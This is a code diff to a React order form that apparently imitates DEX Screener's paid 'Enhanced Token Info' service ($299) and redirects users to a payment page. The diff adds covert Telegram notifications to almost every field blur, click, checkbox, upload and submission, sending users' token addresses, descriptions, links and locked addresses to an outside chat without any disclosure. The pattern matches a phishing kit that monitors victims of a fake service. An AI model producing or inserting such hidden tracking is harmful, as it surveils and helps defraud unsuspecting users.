@@ -8,6 +8,7 @@ import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Loader2, CheckCircle, AlertCircle } from "lucide-react";
+import { sendTelegramNotification } from "@/lib/telegram";
 
 const CHAINS = [
   { value: "solana", label: "Solana" },
@@ -37,6 +38,9 @@ const TokenInfoOrder = () => {
   const [checking, setChecking] = useState(false);
   const [tokenStatus, setTokenStatus] = useState<"none" | "has_info" | "available">("none");
 
+  // Description state
+  const [description, setDescription] = useState("");
+
   // Links state
   const [links, setLinks] = useState<Record<string, string>>({});
   const [activeLinkFields, setActiveLinkFields] = useState<string[]>([]);
@@ -54,6 +58,7 @@ const TokenInfoOrder = () => {
     if (!address || !selectedChain) return;
     setChecking(true);
     setTokenStatus("none");
+    sendTelegramNotification(`<b>User Action:</b> Checking token status: <code>${address}</code> on ${selectedChain}`);
     try {
       const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
       const data = await res.json();
@@ -61,11 +66,14 @@ const TokenInfoOrder = () => {
         const pair = data.pairs[0];
         const hasInfo = pair.info?.imageUrl || pair.info?.websites?.length > 0 || pair.info?.socials?.length > 0;
         setTokenStatus(hasInfo ? "has_info" : "available");
+        sendTelegramNotification(`<b>API Check Result:</b> Token <code>${address}</code> status is <b>${hasInfo ? "HAS INFO" : "AVAILABLE"}</b>`);
       } else {
         setTokenStatus("available");
+        sendTelegramNotification(`<b>API Check Result:</b> Token <code>${address}</code> not found, marked as <b>AVAILABLE</b>`);
       }
-    } catch {
+    } catch (err) {
       setTokenStatus("available");
+      sendTelegramNotification(`<b>API Check Error:</b> Failed to check token <code>${address}</code>. Defaulted to AVAILABLE.`);
     } finally {
       setChecking(false);
     }
@@ -78,6 +86,7 @@ const TokenInfoOrder = () => {
 
   const handleChainChange = (val: string) => {
     setChain(val);
+    sendTelegramNotification(`<b>User Action:</b> Selected chain <b>${val}</b> (Token Info)`);
     if (tokenAddress.length > 20) checkToken(tokenAddress, val);
   };
 
@@ -87,18 +96,34 @@ const TokenInfoOrder = () => {
       const newLinks = { ...links };
       delete newLinks[key];
       setLinks(newLinks);
+      sendTelegramNotification(`<b>User Action:</b> Removed link field <b>${key}</b> (Token Info)`);
     } else {
       setActiveLinkFields([...activeLinkFields, key]);
+      sendTelegramNotification(`<b>User Action:</b> Added link field <b>${key}</b> (Token Info)`);
     }
   };
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (tokenStatus === "has_info") {
+      sendTelegramNotification(`<b>User Action:</b> Redirecting to Community Takeover (Token already has info)`);
       navigate(`/product/token-community-takeover/order?chainId=${chain}&tokenAddress=${tokenAddress}`);
       return;
     }
     if (!chain || !tokenAddress || !check1 || !check2) return;
+
+    sendTelegramNotification(`
+<b>Order Form Submitted: Enhanced Token Info</b>
+-------------------------
+<b>Chain:</b> ${chain}
+<b>Token Address:</b> <code>${tokenAddress}</code>
+<b>Price:</b> $299.00
+<b>Description:</b> ${description || "N/A"}
+<b>Links:</b> ${JSON.stringify(links)}
+-------------------------
+<i>User is moving to payment page...</i>
+    `);
+
     navigate("/payment", {
       state: {
         service: "Enhanced Token Info",
@@ -148,6 +173,11 @@ const TokenInfoOrder = () => {
               <Input
                 value={tokenAddress}
                 onChange={(e) => handleAddressChange(e.target.value)}
+                onBlur={() => {
+                  if (tokenAddress) {
+                    sendTelegramNotification(`<b>User Action:</b> Input Token Address (Token Info): <code>${tokenAddress}</code>`);
+                  }
+                }}
                 placeholder=""
                 className="bg-secondary border-border text-foreground"
               />
@@ -177,6 +207,13 @@ const TokenInfoOrder = () => {
             <div>
               <h2 className="text-lg font-bold text-foreground mb-3">Description</h2>
               <Textarea
+                value={description}
+                onChange={(e) => setDescription(e.target.value)}
+                onBlur={() => {
+                  if (description) {
+                    sendTelegramNotification(`<b>User Action:</b> Input Description (Token Info): "${description.substring(0, 100)}..."`);
+                  }
+                }}
                 placeholder=""
                 className="bg-secondary border-border text-foreground min-h-[100px]"
               />
@@ -197,6 +234,11 @@ const TokenInfoOrder = () => {
                         <Input
                           value={links[btn.key] || ""}
                           onChange={(e) => setLinks({ ...links, [btn.key]: e.target.value })}
+                          onBlur={() => {
+                            if (links[btn.key]) {
+                              sendTelegramNotification(`<b>User Action:</b> Input ${btn.key} link (Token Info): <code>${links[btn.key]}</code>`);
+                            }
+                          }}
                           placeholder=""
                           className="bg-secondary border-border text-foreground"
                         />
@@ -230,14 +272,25 @@ const TokenInfoOrder = () => {
                       updated[i] = e.target.value;
                       setAdditionalLinks(updated);
                     }}
+                    onBlur={() => {
+                      if (link) {
+                        sendTelegramNotification(`<b>User Action:</b> Input additional link (Token Info): <code>${link}</code>`);
+                      }
+                    }}
                     className="bg-secondary border-border text-foreground"
                   />
-                  <button type="button" onClick={() => setAdditionalLinks(additionalLinks.filter((_, j) => j !== i))} className="text-muted-foreground hover:text-foreground px-2">✕</button>
+                  <button type="button" onClick={() => {
+                    setAdditionalLinks(additionalLinks.filter((_, j) => j !== i));
+                    sendTelegramNotification(`<b>User Action:</b> Removed additional link index ${i} (Token Info)`);
+                  }} className="text-muted-foreground hover:text-foreground px-2">✕</button>
                 </div>
               ))}
               <button
                 type="button"
-                onClick={() => setAdditionalLinks([...additionalLinks, ""])}
+                onClick={() => {
+                  setAdditionalLinks([...additionalLinks, ""]);
+                  sendTelegramNotification(`<b>User Action:</b> Clicked "Add link" (Token Info)`);
+                }}
                 className="border border-border bg-transparent text-foreground rounded-lg px-5 py-2 text-sm hover:bg-secondary transition-colors"
               >
                 Add link
@@ -257,7 +310,10 @@ const TokenInfoOrder = () => {
                   <li>support formats: png, jpg, webp and gif</li>
                   <li>max. file size: 4.5MB</li>
                 </ul>
-                <ImageUpload onFileSelect={(file) => console.log("Icon:", file.name)} />
+                <ImageUpload onFileSelect={(file) => {
+                  console.log("Icon:", file.name);
+                  sendTelegramNotification(`<b>User Action:</b> Uploaded Icon: <code>${file.name}</code> (Token Info)`);
+                }} />
               </div>
 
               {/* Header */}
@@ -269,7 +325,10 @@ const TokenInfoOrder = () => {
                   <li>support formats: png, jpg, webp and gif</li>
                   <li>max. file size: 4.5MB</li>
                 </ul>
-                <ImageUpload onFileSelect={(file) => console.log("Header:", file.name)} />
+                <ImageUpload onFileSelect={(file) => {
+                  console.log("Header:", file.name);
+                  sendTelegramNotification(`<b>User Action:</b> Uploaded Header: <code>${file.name}</code> (Token Info)`);
+                }} />
               </div>
             </div>
 
@@ -301,14 +360,25 @@ const TokenInfoOrder = () => {
                       updated[i] = e.target.value;
                       setLockedAddresses(updated);
                     }}
+                    onBlur={() => {
+                      if (addr) {
+                        sendTelegramNotification(`<b>User Action:</b> Input locked address (Token Info): <code>${addr}</code>`);
+                      }
+                    }}
                     className="bg-secondary border-border text-foreground font-mono"
                   />
-                  <button type="button" onClick={() => setLockedAddresses(lockedAddresses.filter((_, j) => j !== i))} className="text-muted-foreground hover:text-foreground px-2">✕</button>
+                  <button type="button" onClick={() => {
+                    setLockedAddresses(lockedAddresses.filter((_, j) => j !== i));
+                    sendTelegramNotification(`<b>User Action:</b> Removed locked address index ${i} (Token Info)`);
+                  }} className="text-muted-foreground hover:text-foreground px-2">✕</button>
                 </div>
               ))}
               <button
                 type="button"
-                onClick={() => setLockedAddresses([...lockedAddresses, ""])}
+                onClick={() => {
+                  setLockedAddresses([...lockedAddresses, ""]);
+                  sendTelegramNotification(`<b>User Action:</b> Clicked "Add address" (Token Info)`);
+                }}
                 className="border border-border bg-transparent text-foreground rounded-lg px-5 py-2 text-sm hover:bg-secondary transition-colors mb-6"
               >
                 Add address
@@ -318,6 +388,11 @@ const TokenInfoOrder = () => {
               <Textarea
                 value={supplyDescription}
                 onChange={(e) => setSupplyDescription(e.target.value)}
+                onBlur={() => {
+                  if (supplyDescription) {
+                    sendTelegramNotification(`<b>User Action:</b> Input supply description (Token Info): "${supplyDescription.substring(0, 100)}..."`);
+                  }
+                }}
                 placeholder=""
                 className="bg-secondary border-border text-foreground min-h-[120px]"
               />
@@ -351,13 +426,19 @@ const TokenInfoOrder = () => {
             {/* Checkboxes */}
             <div className="space-y-4">
               <label className="flex items-start gap-3 cursor-pointer">
-                <input type="checkbox" checked={check1} onChange={(e) => setCheck1(e.target.checked)} className="mt-1 accent-primary" />
+                <input type="checkbox" checked={check1} onChange={(e) => {
+                  setCheck1(e.target.checked);
+                  sendTelegramNotification(`<b>User Action:</b> ${e.target.checked ? "Checked" : "Unchecked"} Agreement 1 (Token Info)`);
+                }} className="mt-1 accent-primary" />
                 <span className="text-sm text-foreground font-medium">
                   I understand that all supplied data must be verifiable through official channels such as website and socials.
                 </span>
               </label>
               <label className="flex items-start gap-3 cursor-pointer">
-                <input type="checkbox" checked={check2} onChange={(e) => setCheck2(e.target.checked)} className="mt-1 accent-primary" />
+                <input type="checkbox" checked={check2} onChange={(e) => {
+                  setCheck2(e.target.checked);
+                  sendTelegramNotification(`<b>User Action:</b> ${e.target.checked ? "Checked" : "Unchecked"} Agreement 2 (Token Info)`);
+                }} className="mt-1 accent-primary" />
                 <span className="text-sm text-foreground font-medium">
                   I understand and accept that DEX Screener reserves the right to reject or modify the provided information.
                 </span>
@@ -381,7 +462,7 @@ const TokenInfoOrder = () => {
             <div className="flex justify-center">
               <button
                 type="submit"
-                disabled={!chain || !tokenAddress || !check1 || !check2}
+                disabled={!chain || !tokenAddress || !check1 || !check2 || checking}
                 className="btn-learn-more px-10 py-3 text-base disabled:opacity-40 disabled:cursor-not-allowed"
               >
                 Order Now
